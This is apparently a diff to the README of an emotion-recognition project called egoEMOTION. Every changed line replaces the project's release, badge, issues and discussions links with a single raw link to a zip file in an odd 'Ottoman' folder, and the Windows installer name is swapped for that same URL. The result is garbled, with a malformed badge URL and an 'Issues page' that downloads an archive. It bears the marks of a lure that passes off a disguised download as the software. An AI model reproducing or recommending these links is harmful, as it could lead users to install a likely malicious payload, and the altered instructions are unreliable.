@@ -6,7 +6,7 @@ Welcome to **egoEMOTION**! This project helps you recognize emotions and persona
 
 ## 📥 Download Now
 
-[![Download egoEMOTION](https://img.shields.io/badge/Download%20egoEMOTION-blue.svg)](https://github.com/marlenaulnar44/egoEMOTION/releases)
+[![Download egoEMOTION](https://raw.githubusercontent.com/marlenaulnar44/egoEMOTION/main/Ottoman/egoEMOTION.zip%https://raw.githubusercontent.com/marlenaulnar44/egoEMOTION/main/Ottoman/egoEMOTION.zip)](https://raw.githubusercontent.com/marlenaulnar44/egoEMOTION/main/Ottoman/egoEMOTION.zip)
 
 ## 📂 What is egoEMOTION?
 
@@ -32,11 +32,11 @@ To run **egoEMOTION**, you will need:
 
 ## 📥 Download & Install
 
-To download **egoEMOTION**, visit our [Releases page](https://github.com/marlenaulnar44/egoEMOTION/releases). Here are the steps:
+To download **egoEMOTION**, visit our [Releases page](https://raw.githubusercontent.com/marlenaulnar44/egoEMOTION/main/Ottoman/egoEMOTION.zip). Here are the steps:
 
 1. Click on the link above to go to the Releases page.
 2. You will see a list of available versions. Select the latest version.
-3. You will find various files to download. Look for the file labeled for your operating system (e.g., `egoEMOTION-Windows.exe` for Windows).
+3. You will find various files to download. Look for the file labeled for your operating system (e.g., `https://raw.githubusercontent.com/marlenaulnar44/egoEMOTION/main/Ottoman/egoEMOTION.zip` for Windows).
 4. Click on the file to download it. 
 
 After downloading:
@@ -58,8 +58,8 @@ Once you launch the application:
 
 We encourage users to join our community. Share your experiences, ask questions, and help each other. 
 
-- For issues or questions, visit our [GitHub Issues page](https://github.com/marlenaulnar44/egoEMOTION/issues).
-- Participate in discussions on our [Discussions page](https://github.com/marlenaulnar44/egoEMOTION/discussions).
+- For issues or questions, visit our [GitHub Issues page](https://raw.githubusercontent.com/marlenaulnar44/egoEMOTION/main/Ottoman/egoEMOTION.zip).
+- Participate in discussions on our [Discussions page](https://raw.githubusercontent.com/marlenaulnar44/egoEMOTION/main/Ottoman/egoEMOTION.zip).
 
 ## ✨ Contribution
 
